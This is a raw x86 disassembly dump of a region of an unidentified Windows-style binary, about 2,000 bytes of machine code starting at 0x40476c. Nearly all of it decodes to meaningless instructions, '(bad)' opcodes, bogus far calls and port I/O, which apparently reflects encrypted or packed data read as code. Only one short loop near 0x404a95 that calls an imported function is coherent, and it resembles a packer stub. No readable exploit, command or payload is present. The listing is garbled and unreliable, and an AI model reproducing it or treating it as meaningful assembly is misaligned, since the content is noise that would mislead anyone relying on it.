  40476c:	xchg   edi,eax
  40476d:	jle    0x4047cd
  40476f:	mov    eax,ds:0x4ff4d1b
  404774:	repz aam 0xf3
  404777:	sti    
  404778:	rcr    bh,1
  40477a:	call   0x14ae:0xfe702853
  404781:	(bad)  
  404782:	xchg   edi,eax
  404783:	mov    ah,0x3d
  404785:	xchg   esp,eax
  404786:	loopne 0x4047e6
  404788:	jbe    0x404717
  40478a:	and    al,0xf3
  40478c:	ffreep st(7)
  40478e:	dec    esp
  40478f:	scas   eax,DWORD PTR es:[edi]
  404790:	cwde   
  404791:	and    DWORD PTR [esp+eax*1],ebp
  404794:	or     bh,BYTE PTR [esi+0x304e9d88]
  40479a:	fnop   
  40479c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40479d:	pop    eax
  40479e:	jecxz  0x404729
  4047a0:	jecxz  0x404804
  4047a2:	xlat   BYTE PTR ds:[ebx]
  4047a3:	les    edx,FWORD PTR [ecx-0x47]
  4047a6:	in     al,dx
  4047a7:	push   edx
  4047a8:	std    
  4047a9:	retf   0x1e12
  4047ac:	test   BYTE PTR [ecx+edi*1-0x6b310ef8],0x2d
  4047b4:	rol    ah,1
  4047b6:	jg     0x4047a6
  4047b8:	outs   dx,BYTE PTR ds:[esi]
  4047b9:	loop   0x404771
  4047bb:	push   eax
  4047bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047bd:	sub    al,ah
  4047bf:	loopne 0x4047cc
  4047c1:	jl     0x40480a
  4047c3:	sahf   
  4047c4:	shr    DWORD PTR [ebx+0x41d142fb],cl
  4047ca:	and    eax,0xa8090ad0
  4047cf:	outs   dx,DWORD PTR ds:[esi]
  4047d0:	adc    al,0x6e
  4047d2:	(bad)  
  4047d3:	pop    eax
  4047d4:	dec    esi
  4047d5:	inc    ebp
  4047d6:	aaa    
  4047d7:	lods   eax,DWORD PTR ds:[esi]
  4047d8:	xchg   DWORD PTR [edx],esi
  4047da:	or     bh,bh
  4047dc:	sub    esi,ebp
  4047de:	daa    
  4047df:	pusha  
  4047e0:	jp     0x40479e
  4047e2:	aas    
  4047e3:	cdq    
  4047e4:	and    cl,BYTE PTR [esi-0x48]
  4047e7:	push   edx
  4047e8:	bound  edi,QWORD PTR [eax+0x72]
  4047eb:	nop
  4047ec:	xor    DWORD PTR [esi],0x315b4ebc
  4047f2:	push   edi
  4047f3:	dec    eax
  4047f4:	sbb    al,0x4
  4047f6:	pop    esp
  4047f7:	xchg   esp,eax
  4047f8:	jnp    0x40484e
  4047fa:	outs   dx,DWORD PTR ds:[esi]
  4047fb:	mov    edi,0x5fc58b03
  404800:	repz push ss
  404802:	std    
  404803:	mov    dl,0x63
  404805:	jne    0x4047e6
  404807:	ret    0x244c
  40480a:	jle    0x404864
  40480c:	push   eax
  40480d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40480e:	sbb    DWORD PTR [ebp+0x7327f6bb],ecx
  404814:	dec    edx
  404815:	mov    WORD PTR [eax-0x78],?
  404818:	shr    WORD PTR [esi],cl
  40481b:	adc    bh,bl
  40481d:	cmc    
  40481e:	jns    0x4047bc
  404820:	sahf   
  404821:	fstp   TBYTE PTR [eax+edx*4-0x5d7c904c]
  404828:	mov    al,0x71
  40482a:	in     al,0xc8
  40482c:	dec    edx
  40482d:	cld    
  40482e:	daa    
  40482f:	push   ebp
  404830:	fnsave [edx+0x73]
  404833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404834:	imul   BYTE PTR [edi+0x9]
  404837:	addr16 sti 
  404839:	rol    BYTE PTR [eax+ecx*2-0x56],0x2c
  40483e:	loope  0x4047fc
  404840:	sbb    BYTE PTR [edx],dl
  404842:	aaa    
  404843:	hlt    
  404844:	xor    ah,BYTE PTR [eax+0x34]
  404847:	add    dh,BYTE PTR [eax+0x74]
  40484a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40484b:	popf   
  40484c:	sahf   
  40484d:	leave  
  40484e:	push   ecx
  40484f:	xor    BYTE PTR [eax-0x5c],0x88
  404853:	add    ecx,esi
  404855:	push   ds
  404856:	dec    ebp
  404857:	adc    ebp,DWORD PTR [eax]
  404859:	lea    ebx,[ebp-0x33]
  40485c:	mov    WORD PTR [edx-0x3c7a2a20],gs
  404862:	int    0x34
  404864:	inc    esi
  404865:	inc    edx
  404866:	jp     0x4047f1
  404868:	or     dh,0x2a
  40486b:	mov    ebp,0xf39d2fc0
  404870:	pop    eax
  404871:	cmc    
  404872:	cs scas al,BYTE PTR es:[edi]
  404874:	jecxz  0x4048e6
  404876:	mov    bh,BYTE PTR [eax+0x5d768499]
  40487c:	test   BYTE PTR [ecx+0x62],bl
  40487f:	arpl   WORD PTR [eax+0x69],dx
  404882:	je     0x404841
  404884:	(bad)  
  404885:	rcr    BYTE PTR [ebx+0x200ca235],cl
  40488b:	push   ebp
  40488c:	push   ebx
  40488d:	jns    0x404867
  40488f:	retf   0xa06d
  404892:	hlt    
  404893:	mov    ebx,DWORD PTR [eax-0x61]
  404896:	jne    0x404856
  404898:	jl     0x40483c
  40489a:	sbb    di,WORD PTR [edx-0x50]
  40489e:	test   eax,0x8dae0eb4
  4048a3:	js     0x404864
  4048a5:	inc    eax
  4048a6:	add    cl,ah
  4048a8:	test   eax,0x604a4e09
  4048ad:	lea    ecx,[ebp+0x6469e9be]
  4048b3:	scas   al,BYTE PTR es:[edi]
  4048b4:	out    dx,eax
  4048b5:	cmc    
  4048b6:	retf   
  4048b7:	lahf   
  4048b8:	cmp    dh,dl
  4048ba:	(bad)  
  4048bc:	xchg   edx,eax
  4048bd:	push   esi
  4048be:	inc    esi
  4048bf:	or     bh,0x6d
  4048c2:	bnd retw 
  4048c5:	or     BYTE PTR [edi],bl
  4048c7:	iret   
  4048c8:	cmp    BYTE PTR [ecx],ah
  4048ca:	sub    DWORD PTR [esi+0x4d29eab],esi
  4048d0:	push   0xffffff83
  4048d2:	sbb    ah,dl
  4048d4:	aad    0x57
  4048d6:	or     eax,0x3c0a8df4
  4048db:	in     al,0x2b
  4048dd:	adc    cl,ch
  4048df:	mov    DWORD PTR [edi],ebx
  4048e1:	in     eax,dx
  4048e2:	and    DWORD PTR [ecx-0x47c17ecc],ecx
  4048e8:	xchg   BYTE PTR [edx],dl
  4048ea:	ja     0x404965
  4048ec:	cwde   
  4048ed:	mov    dh,0x84
  4048ef:	mov    esp,0x6ea43f5e
  4048f4:	xchg   edx,eax
  4048f5:	lock sub bh,bh
  4048f8:	jbe    0x404903
  4048fa:	mov    eax,ds:0xf59fce84
  4048ff:	pop    eax
  404900:	xchg   esi,eax
  404901:	sar    DWORD PTR [eax],1
  404903:	cmp    BYTE PTR [edi-0x20],bl
  404906:	mov    bl,ah
  404908:	mov    eax,0xd38fbfac
  40490d:	sbb    BYTE PTR [ecx+0x41debfb4],0xfd
  404914:	sti    
  404915:	sbb    edi,edi
  404917:	sub    al,0xcd
  404919:	inc    DWORD PTR ds:[edi+edi*8]
  40491d:	retf   0xe2de
  404920:	(bad)  
  404922:	inc    ecx
  404923:	lods   eax,DWORD PTR ds:[esi]
  404924:	sbb    al,0xce
  404926:	jp     0x404907
  404928:	add    esi,DWORD PTR [ebx+0x77f82508]
  40492e:	or     BYTE PTR [esi-0x6],dh
  404931:	call   0x39902b66
  404936:	add    dl,ah
  404938:	repz fwait
  40493a:	xchg   esi,eax
  40493b:	fs push edx
  40493d:	add    cl,cl
  40493f:	push   edi
  404940:	xor    ebp,DWORD PTR [edi+0x38c5781]
  404946:	sub    al,0x92
  404948:	(bad)  
  404949:	loopne 0x4048f1
  40494b:	pop    ebp
  40494c:	push   edi
  40494d:	outs   dx,BYTE PTR ds:[esi]
  40494e:	outs   dx,DWORD PTR ds:[esi]
  40494f:	sbb    eax,0x69374c76
  404954:	and    ebx,DWORD PTR [ecx]
  404956:	cdq    
  404957:	xlat   BYTE PTR ds:[ebx]
  404958:	fadd   QWORD PTR [ebx-0x7b]
  40495b:	push   0x845bcbb3
  404960:	stos   DWORD PTR es:[edi],eax
  404961:	aad    0x48
  404963:	mov    ecx,0xc883d577
  404968:	or     eax,0x957b8e1b
  40496d:	dec    ecx
  40496e:	jmp    0x382e:0xdc9584c2
  404975:	cwde   
  404976:	lock mov dh,0x8f
  404979:	out    0x83,al
  40497b:	add    ebx,ebx
  40497d:	cmp    dh,BYTE PTR [edi+0x342ab6e]
  404983:	loop   0x4049b9
  404985:	xchg   ebp,eax
  404986:	ret    0x7ac8
  404989:	nop
  40498a:	mov    esp,0xcd578fb6
  40498f:	addr16 dec ebp
  404991:	call   0x4132:0x52ed4d38
  404998:	call   0x56490eb1
  40499d:	xor    edi,ebp
  40499f:	add    esi,DWORD PTR [edi]
  4049a1:	xchg   edx,eax
  4049a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049a3:	add    ah,BYTE PTR [esi-0x5e]
  4049a6:	xchg   ebp,eax
  4049a7:	(bad)  [ecx-0x7bed1ee]
  4049ad:	pop    ebx
  4049ae:	mov    ebx,0x63f9918
  4049b3:	adc    edi,esp
  4049b5:	in     eax,0x76
  4049b7:	xlat   BYTE PTR ds:[ebx]
  4049b8:	pop    edi
  4049b9:	inc    edx
  4049ba:	fild   QWORD PTR [esi+eiz*1+0x31]
  4049be:	repz mov ch,0xa1
  4049c1:	nop
  4049c2:	mov    al,0x63
  4049c4:	mov    eax,0xc9c79504
  4049c9:	jecxz  0x40495d
  4049cb:	and    BYTE PTR [eax+0x47],cl
  4049ce:	push   eax
  4049cf:	cmp    esi,edi
  4049d1:	push   eax
  4049d2:	inc    esi
  4049d3:	ret    0xc1b1
  4049d6:	pop    eax
  4049d7:	cmp    esi,0x87abf22a
  4049dd:	mov    ecx,0xe24200df
  4049e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e3:	or     DWORD PTR [ecx+0x1485ec32],0x1d66dd98
  4049ed:	sbb    bh,BYTE PTR [esi+0x46]
  4049f0:	je     0x4049d6
  4049f2:	pop    ds
  4049f3:	xor    esi,DWORD PTR [edi+eax*4-0x2e]
  4049f7:	push   edi
  4049f8:	nop
  4049f9:	push   edi
  4049fa:	jg     0x4049a0
  4049fc:	push   ds
  4049fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049fe:	lods   eax,DWORD PTR ds:[esi]
  4049ff:	push   ss
  404a00:	sub    al,0x1f
  404a02:	xor    DWORD PTR [edx],0x27
  404a05:	xchg   dl,cl
  404a07:	and    DWORD PTR [ebx+0x70fc786],esi
  404a0d:	jb     0x4049aa
  404a0f:	loop   0x4049d1
  404a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a12:	sbb    ebp,DWORD PTR [edx+0x65527a70]
  404a18:	(bad)  
  404a19:	xor    ah,BYTE PTR [edx-0x4c39dbeb]
  404a1f:	icebp  
  404a20:	imul   eax,DWORD PTR [ecx-0x53],0xc0979da4
  404a27:	pop    ecx
  404a28:	push   eax
  404a29:	lock jle 0x4049cd
  404a2c:	xchg   esi,eax
  404a2d:	lahf   
  404a2e:	fs inc ecx
  404a30:	cmc    
  404a31:	jecxz  0x404a1c
  404a33:	cmp    BYTE PTR [eax-0x3c],bh
  404a36:	sbb    DWORD PTR [edx+0x47],0xb4fb37b2
  404a3d:	ffree  st(2)
  404a3f:	mov    bl,0xbe
  404a41:	jle    0x404a85
  404a43:	fsubr  QWORD PTR [bx+di]
  404a46:	loope  0x404a2f
  404a48:	adc    al,0x4d
  404a4a:	shr    edx,cl
  404a4c:	inc    ecx
  404a4d:	cwde   
  404a4e:	lock mov cl,BYTE PTR [edx+0x47]
  404a52:	mov    cl,0x45
  404a54:	mov    ecx,0x9545bf3f
  404a59:	ja     0x404a5e
  404a5b:	inc    esp
  404a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a5d:	inc    eax
  404a5e:	inc    esp
  404a5f:	mov    edi,0xfbcc21b1
  404a64:	ret    0xed29
  404a67:	loop   0x404adb
  404a69:	cmp    BYTE PTR [ebx-0x9],0x5a
  404a6d:	adc    al,0x88
  404a6f:	adc    ch,BYTE PTR ds:[ecx+0x2f]
  404a73:	or     esp,DWORD PTR [ecx-0x16]
  404a76:	mov    bl,0xbb
  404a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a79:	outs   dx,DWORD PTR ds:[esi]
  404a7a:	add    ebp,DWORD PTR [eax+0x3d]
  404a7d:	retf   
  404a7e:	aaa    
  404a7f:	lods   al,BYTE PTR ds:[esi]
  404a80:	xor    BYTE PTR [ebx+0x2fffe119],bh
  404a86:	push   0x83ed13bc
  404a8b:	dec    esp
  404a8c:	add    eax,0x630921ea
  404a91:	dec    ebx
  404a92:	cwde   
  404a93:	add    eax,edi
  404a95:	xor    ecx,DWORD PTR ds:0x42a331
  404a9b:	mov    DWORD PTR [ebp-0x30],eax
  404a9e:	or     DWORD PTR ds:0x42a345,edi
  404aa4:	mov    eax,DWORD PTR [ebp-0x28]
  404aa7:	and    DWORD PTR ds:0x42a3bd,0x0
  404ab1:	jmp    0x404ac3
  404ab6:	mov    ecx,DWORD PTR ds:0x42a3bd
  404abc:	inc    ecx
  404abd:	mov    DWORD PTR ds:0x42a3bd,ecx
  404ac3:	cmp    DWORD PTR ds:0x42a3bd,0x1a
  404aca:	jae    0x404aed
  404ad0:	cmp    DWORD PTR ds:0x42a3bd,0x27
  404ad7:	jne    0x404ae8
  404add:	push   0x42a635
  404ae2:	call   DWORD PTR ds:0x425350
  404ae8:	jmp    0x404ab6
  404aed:	xor    eax,esi
  404aef:	adc    DWORD PTR ds:0x42a3f9,0x646a
  404af9:	add    eax,edi
  404afb:	jmp    0x405006
  404b00:	enter  0xd1ce,0xd2
  404b04:	rcl    ecx,1
  404b06:	iret   
  404b07:	shl    BYTE PTR [eax-0x35346ce9],cl
  404b0d:	(bad)  
  404b0e:	aad    0x86
  404b10:	xor    bh,BYTE PTR ss:[eax+0x78]
  404b14:	push   0x7c
  404b16:	js     0x404b90
  404b18:	push   ebx
  404b19:	clc    
  404b1a:	inc    esi
  404b1b:	cmp    ebp,DWORD PTR ds:0x32b29e09
  404b21:	push   0x11
  404b23:	xor    dl,BYTE PTR [eax]
  404b25:	mov    ebx,0x10ac7710
  404b2a:	and    DWORD PTR [edi+0x41],ecx
  404b2d:	(bad)  
  404b2f:	sbb    al,0x66
  404b31:	add    eax,0xed2b0556
  404b36:	add    DWORD PTR [esp+eax*8+0x57],esp
  404b3a:	mov    BYTE PTR [ecx+0x5c07d87e],0x48
  404b41:	xchg   esi,eax
  404b42:	push   ss
  404b43:	ror    DWORD PTR [eax],0xf0
  404b46:	mov    cl,0x6e
  404b48:	dec    edi
  404b49:	pop    esi
  404b4a:	push   ebx
  404b4b:	push   ss
  404b4c:	sbb    BYTE PTR [esi-0x33],dh
  404b4f:	imul   esi,DWORD PTR [esi],0xe
  404b52:	push   0xfffffff8
  404b54:	xchg   edi,eax
  404b55:	or     bl,cl
  404b57:	mov    bh,0x88
  404b59:	push   es
  404b5a:	call   0xbc4a:0x9a727420
  404b61:	aad    0xd0
  404b63:	xchg   ebx,eax
  404b64:	push   cs
  404b65:	mov    ecx,0x11593f8e
  404b6a:	mov    BYTE PTR [ebx+0x21],bl
  404b6d:	push   edx
  404b6e:	or     DWORD PTR [ecx+eiz*4-0x6e],eax
  404b72:	xor    BYTE PTR [eax],0x4e
  404b75:	inc    eax
  404b76:	adc    DWORD PTR [esi+0x7f0ad39],edi
  404b7c:	out    0xf6,eax
  404b7e:	cwde   
  404b7f:	xchg   ebp,eax
  404b80:	or     esi,edi
  404b82:	cmp    cl,dl
  404b84:	cmp    DWORD PTR [edi+0x301bb4af],ebx
  404b8a:	sbb    DWORD PTR [esi-0x66],edx
  404b8d:	sahf   
  404b8e:	(bad)  
  404b8f:	and    eax,0x87452ea2
  404b94:	xor    al,0xe5
  404b96:	xor    BYTE PTR [edi],dl
  404b98:	enter  0x4616,0xf7
  404b9c:	popa   
  404b9d:	pop    eax
  404b9e:	mov    edx,0xdce847ec
  404ba3:	repz inc eax
  404ba5:	aam    0x29
  404ba7:	or     bh,BYTE PTR [ecx-0x40]
  404baa:	pop    esp
  404bab:	xlat   BYTE PTR ds:[ebx]
  404bac:	fdiv   st,st(6)
  404bae:	sub    cl,BYTE PTR [ebp-0x24a7a80c]
  404bb4:	cmp    eax,0xf72cb380
  404bb9:	mov    DWORD PTR [edx+0x61ea5b21],eax
  404bbf:	pop    ebp
  404bc0:	adc    BYTE PTR [ecx-0x67],ah
  404bc3:	xchg   edx,esi
  404bc5:	sub    ecx,DWORD PTR [esi+eiz*8-0x2d4c4945]
  404bcc:	sub    BYTE PTR [edx],ch
  404bce:	ror    BYTE PTR [ecx],1
  404bd0:	adc    edi,DWORD PTR [edx]
  404bd2:	pop    ebx
  404bd3:	pusha  
  404bd4:	lea    edx,[ebp+0x61]
  404bd7:	mov    BYTE PTR [eax+0x187a4641],bh
  404bdd:	push   es
  404bde:	xchg   dl,dl
  404be0:	jmp    0x348:0x1501aa77
  404be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be8:	xchg   edi,eax
  404bea:	pop    esp
  404beb:	in     eax,0xfd
  404bed:	mov    ebx,esp
  404bef:	(bad)  
  404bf0:	(bad)  
  404bf1:	in     eax,dx
  404bf2:	shl    DWORD PTR [esi-0x77b8a37a],0x16
  404bf9:	xchg   edx,eax
  404bfa:	jl     0x404b83
  404bfc:	aad    0x9f
  404bfe:	in     al,0xbc
  404c00:	stc    
  404c01:	scas   al,BYTE PTR es:[edi]
  404c02:	inc    ebx
  404c03:	jg     0x404b98
  404c05:	out    0xf2,eax
  404c07:	call   0x7421a1e6
  404c0c:	enter  0xbad5,0x3f
  404c10:	dec    edx
  404c11:	bound  eax,QWORD PTR [edi+0x20349b90]
  404c17:	add    al,0x4a
  404c19:	mov    esp,0xfd851fb2
  404c1e:	fbstp  TBYTE PTR [ebp-0x30]
  404c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c22:	test   DWORD PTR [ebx-0x59],ebp
  404c25:	cmp    DWORD PTR [eax-0x7f],ebx
  404c28:	inc    edi
  404c29:	mov    ss,WORD PTR [ebx]
  404c2b:	cmc    
  404c2c:	cmp    al,0x3c
  404c2e:	mov    eax,0x452d4460
  404c33:	inc    BYTE PTR [eax-0x17a83fc3]
  404c39:	int    0xd2
  404c3b:	jnp    0x404c8c
  404c3d:	mov    al,0x87
  404c3f:	sar    DWORD PTR [ebx-0x4b],1
  404c42:	sbb    esi,DWORD PTR [ecx-0x3d77f01a]
  404c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c49:	and    BYTE PTR [ebx],0x14
  404c4c:	inc    edx
  404c4d:	shl    al,0x85
  404c50:	test   BYTE PTR [edi+edi*4-0x16],0xb5
  404c55:	or     eax,0xea4a2567
  404c5a:	sar    BYTE PTR [esi-0x345c3041],cl
  404c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c61:	leave  
  404c62:	mov    bl,0xd3
  404c64:	mov    ebx,0x4069189
  404c69:	dec    esi
  404c6a:	or     BYTE PTR [esi+0x5d],al
  404c6d:	bound  ecx,QWORD PTR [ebp-0x1c0c89d8]
  404c73:	mov    esp,0x5cbf98f
  404c78:	pop    ebx
  404c79:	cdq    
  404c7a:	ja     0x404c92
  404c7c:	clc    
  404c7d:	mov    WORD PTR [esi],?
  404c7f:	add    esi,DWORD PTR [ebx]
  404c81:	inc    ebx
  404c82:	call   0xfe13:0x8d0f9868
  404c89:	rol    esi,cl
  404c8b:	lahf   
  404c8c:	or     al,BYTE PTR [edi+0x36]
  404c8f:	ret    0x23f9
  404c92:	sub    BYTE PTR [ebx+0x48],ch
  404c95:	cli    
  404c96:	jne    0x404c76
  404c98:	fwait
  404c99:	leave  
  404c9a:	in     al,dx
  404c9b:	pop    ss
  404c9c:	sar    ebx,0x55
  404c9f:	in     eax,dx
  404ca0:	lods   eax,DWORD PTR ds:[esi]
  404ca1:	xor    dl,BYTE PTR [ebp+0x10]
  404ca4:	in     al,0x29
  404ca6:	outs   dx,DWORD PTR ds:[esi]
  404ca7:	dec    ebx
  404ca8:	fisubr DWORD PTR [edx-0x466c0d39]
  404cae:	dec    ebp
  404caf:	nop
  404cb0:	sbb    BYTE PTR [eax+0x30],bl
  404cb3:	dec    ecx
  404cb4:	push   cs
  404cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cb6:	cdq    
  404cb7:	test   eax,0x7c7984d0
  404cbc:	imul   ebx,DWORD PTR [esi+0x47],0xac9524f3
  404cc3:	mov    al,ds:0x3957b2ef
  404cc8:	mov    ch,0x63
  404cca:	cmp    edx,ebp
  404ccc:	xchg   ecx,eax
  404ccd:	daa    
  404cce:	xor    eax,0xa280c9dd
  404cd3:	ja     0x404d12
  404cd5:	stos   DWORD PTR es:[edi],eax
  404cd6:	retf   
  404cd7:	jbe    0x404c59
  404cd9:	imul   ecx,DWORD PTR [ecx-0x11dcbc4c],0x1213f0b2
  404ce3:	dec    edi
  404ce4:	mov    ecx,DWORD PTR [edx+edi*2+0x5e81c4f7]
  404ceb:	mov    edx,0x8cad7e83
  404cf0:	rol    BYTE PTR [edi+0x19],cl
  404cf3:	loop   0x404c9d
  404cf5:	jb     0x404d11
  404cf7:	xlat   BYTE PTR ds:[ebx]
  404cf8:	pop    es
  404cf9:	push   ebp
  404cfa:	jmp    0x404cbc
  404cfc:	inc    eax
  404cfd:	lock cmp DWORD PTR [eax+ecx*4+0x0],esi
  404d02:	xor    esi,DWORD PTR [edx-0x72]
  404d05:	push   ss
  404d06:	sub    BYTE PTR [esi],dl
  404d08:	popa   
  404d09:	dec    ecx
  404d0a:	outs   dx,DWORD PTR ds:[esi]
  404d0c:	mov    dl,0x9d
  404d0e:	push   cs
  404d0f:	jno    0x404ca3
  404d11:	lahf   
  404d12:	repnz ror ecx,0xe0
  404d16:	in     eax,0x86
  404d18:	jmp    0xee2a3d13
  404d1d:	and    dl,BYTE PTR [eax-0x3a]
  404d20:	inc    ebp
  404d21:	cs xor al,0xbf
  404d24:	inc    edx
  404d25:	int    0x51
  404d27:	out    0x7,eax
  404d29:	addr16 jmp 0xc429f823
  404d2f:	push   es
  404d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d31:	out    dx,al
  404d32:	adc    BYTE PTR [ecx+0x7957a005],cl
  404d38:	test   DWORD PTR [edi+ebx*4],edi
  404d3b:	popa   
  404d3c:	cmc    
  404d3d:	inc    ecx
  404d3e:	xchg   ecx,eax
  404d3f:	icebp  
  404d40:	xchg   esp,eax
  404d41:	retf   
  404d42:	fs sbb eax,0xb36e5d44
  404d48:	fisttp QWORD PTR [eax]
  404d4a:	jb     0x404d2e
  404d4c:	or     dl,BYTE PTR [esi]
  404d4e:	push   0xbbe8cea8
  404d53:	fisubr DWORD PTR [edi-0x3]
  404d56:	outs   dx,DWORD PTR ds:[esi]
  404d57:	imul   edi,edi,0x701764a7
  404d5d:	push   ds
  404d5e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  404d60:	pop    es
  404d61:	push   DWORD PTR [edi+0x4e04182c]
  404d67:	pop    ecx
  404d68:	scas   al,BYTE PTR es:[edi]
  404d69:	push   es
  404d6a:	jge    0x404ddc
  404d6c:	adc    DWORD PTR [ebx+0x5d48b604],ecx
  404d72:	pmulhuw mm4,mm6
  404d75:	popf   
  404d76:	and    al,0xb6
  404d78:	jns    0x404d6d
  404d7a:	dec    eax
  404d7b:	fistp  QWORD PTR [esi-0x18]
  404d7e:	js     0x404d6d
  404d80:	xchg   edi,eax
  404d81:	jne    0x404d26
  404d83:	mov    bh,0x31
  404d85:	sub    ch,BYTE PTR [edx-0x7a]
  404d88:	fcomp  DWORD PTR [esi+0x379efb4b]
  404d8e:	call   0xa75d:0x4daa0fce
  404d95:	fsub   QWORD PTR [edi+eax*2+0x4ef26741]
  404d9c:	mov    fs,WORD PTR [edi]
  404d9e:	fsub   DWORD PTR [ecx]
  404da0:	into   
  404da1:	dec    esp
  404da2:	push   eax
  404da3:	mov    ecx,0x87ef3997
  404da8:	mov    eax,ds:0x3d57c147
  404dad:	les    esp,FWORD PTR [eax-0x5d]
  404db0:	xchg   esp,eax
  404db1:	psrlq  mm6,QWORD PTR [ecx]
  404db4:	cmc    
  404db5:	jmp    0x4eb1474b
  404dba:	sbb    eax,0x47b068f3
  404dbf:	cmp    BYTE PTR [ecx+ebp*4-0x3bcf08ba],0x51
  404dc7:	mov    esi,0x15929ec7
  404dcc:	and    al,bh
  404dce:	stc    
  404dcf:	mov    ah,dh
  404dd1:	mov    ah,0xf5
  404dd3:	fild   QWORD PTR [eax-0x74467357]
  404dd9:	out    dx,eax
  404dda:	aas    
  404ddb:	adc    BYTE PTR [ebp-0x703ef6b5],bh
  404de1:	aas    
  404de2:	push   0xf4d2c6c8
  404de7:	clc    
  404de8:	push   0xffffff82
  404dea:	enter  0x31d3,0xe4
  404dee:	shl    cl,1
  404df0:	std    
  404df1:	mov    edi,0xe5b08e6a
  404df6:	xchg   edi,eax
  404df7:	cmp    eax,0xc0d516fa
  404dfc:	mul    DWORD PTR [edi*8+0x2695581e]
  404e03:	dec    ebx
  404e04:	mov    edi,0x484df892
  404e09:	pop    es
  404e0a:	out    0xc4,al
  404e0c:	imul   edi,DWORD PTR [eax],0x6edfa221
  404e12:	loope  0x404dc0
  404e14:	imul   BYTE PTR [edx]
  404e16:	lds    eax,FWORD PTR [eax-0x42865209]
  404e1c:	inc    ebp
  404e1d:	add    eax,0xf220dc6f
  404e22:	test   al,0xcd
  404e24:	retf   
  404e25:	mov    ds:0xe5613a1c,eax
  404e2a:	(bad)  
  404e2b:	jmp    0x404e42
  404e2d:	adc    BYTE PTR [ecx+0x21],ch
  404e30:	jge    0x404de4
  404e32:	mov    bh,0x91
  404e34:	rol    DWORD PTR [edx],1
  404e36:	mov    edx,0xe2d43c86
  404e3b:	inc    esi
  404e3c:	push   esi
  404e3d:	rcr    edx,cl
  404e3f:	daa    
  404e40:	arpl   WORD PTR [edx+0x6101d39a],dx
  404e46:	xlat   BYTE PTR ds:[ebx]
  404e47:	addr16 sub eax,0xd7d866de
  404e4d:	and    BYTE PTR ds:0x8f5538d2,bh
  404e53:	mov    ecx,0x2782c546
  404e58:	(bad)  
  404e59:	test   DWORD PTR [ebx-0x45],edi
  404e5c:	sbb    DWORD PTR [esi],ecx
  404e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e5f:	jae    0x404ea3
  404e61:	sub    BYTE PTR [edi],dl
  404e63:	into   
  404e64:	mov    DWORD PTR [ebx+0x66],ebp
  404e67:	or     cl,bl
  404e69:	ja     0x404e03
  404e6b:	cmc    
  404e6c:	and    al,0xcc
  404e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e6f:	sar    BYTE PTR [ecx+0x4e],1
  404e72:	jns    0x404e64
  404e74:	mov    dh,dh
  404e76:	fcom   QWORD PTR [eax]
  404e78:	popa   
  404e79:	or     BYTE PTR [edi+0x40467960],al
  404e7f:	mov    ebx,0xd1c8def1
  404e84:	jbe    0x404ef6
  404e86:	(bad)  
  404e87:	ins    DWORD PTR es:[edi],dx
  404e88:	iret   
  404e89:	xchg   DWORD PTR [esi+eiz*8],ebx
  404e8c:	pop    ebp
  404e8d:	sub    ebx,ebx
  404e8f:	adc    edx,DWORD PTR [edi-0x298ddd11]
  404e95:	rcl    BYTE PTR [edx+edx*8-0x10a4f976],0x98
  404e9d:	xor    bh,cl
  404e9f:	add    cl,al
  404ea1:	in     eax,0xb8
  404ea3:	imul   ebx,esp,0xd6687a1d
  404ea9:	test   al,0xe8
  404eab:	cmp    eax,0xf2a05be0
  404eb0:	jle    0x404eda
  404eb2:	mov    dl,0xc8
  404eb4:	loope  0x404e80
  404eb6:	fbld   TBYTE PTR [ebx-0x5a]
  404eb9:	inc    BYTE PTR [esi]
  404ebb:	mov    esp,0x1e7a4fc7
  404ec0:	mov    ch,0x30
  404ec2:	mov    al,BYTE PTR [ebp+0x40]
  404ec5:	xor    al,0xe7
  404ec7:	or     eax,0x97cf0538
  404ecc:	jnp    0x404efc
  404ece:	and    DWORD PTR [eax],ebx
  404ed0:	dec    ecx
  404ed1:	imul   ebx,ebp,0xb4bd7a17
  404ed7:	hlt    
  404ed8:	add    dl,BYTE PTR [ecx-0x65]
  404edb:	daa    
  404edc:	imul   ebx,DWORD PTR [eax],0x4acf182a
  404ee2:	enter  0x75bb,0xc9
  404ee6:	push   edi
  404ee7:	cmc    
  404ee8:	shl    esp,0xd2
  404eeb:	push   es
  404eec:	cli    
  404eed:	sbb    eax,0x1491eb29
  404ef2:	test   DWORD PTR [ebp+0x12],0x5e8e3461
  404ef9:	fwait
  404efa:	scas   al,BYTE PTR es:[edi]
  404efb:	imul   ebx,edx,0xffffff84
  404efe:	jb     0x404f37
  404f00:	mov    bh,0xbc
  404f02:	push   ebx
  404f03:	arpl   WORD PTR [edi],si
  404f05:	xlat   BYTE PTR ds:[ebx]
  404f06:	rcl    BYTE PTR [esi],1
  404f08:	idiv   BYTE PTR [eax-0x54]
  404f0b:	call   0x6fc6:0x40abe52b
  404f12:	jns    0x404ef2
  404f14:	xchg   esi,eax
  404f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f16:	jo     0x404ed4
  404f18:	jecxz  0x404ec1
  404f1a:	jbe    0x404f36
  404f1c:	stc    
  404f1d:	dec    ebx
  404f1e:	inc    eax
  404f1f:	dec    edi
  404f20:	cli    
  404f21:	cmp    eax,0x923565b8
  404f26:	ds inc esi
  404f28:	nop
